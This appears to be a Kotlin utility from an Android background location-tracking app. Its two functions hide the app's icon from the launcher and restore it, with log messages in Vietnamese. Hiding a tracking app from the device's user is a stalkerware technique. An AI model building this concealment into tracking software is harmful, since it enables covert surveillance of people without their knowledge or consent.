package com.plcoding.backgroundlocationtracking.util

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log

object AppHider {
    private const val TAG = "AppHider"
    private const val MAIN_ACTIVITY = "com.plcoding.backgroundlocationtracking.MainActivity"

    fun hideAppIcon(context: Context) {
        try {
            val componentName = ComponentName(context, MAIN_ACTIVITY)
            context.packageManager?.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.i(TAG, "✅ Ứng dụng đã bị ẩn khỏi launcher.")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Lỗi khi ẩn ứng dụng: ${e.message}")
        }
    }

    fun showAppIcon(context: Context) {
        try {
            val componentName = ComponentName(context, MAIN_ACTIVITY)
            context.packageManager?.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.i(TAG, "👁 Ứng dụng đã được hiển thị lại.")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Lỗi khi hiện lại ứng dụng: ${e.message}")
        }
    }
}
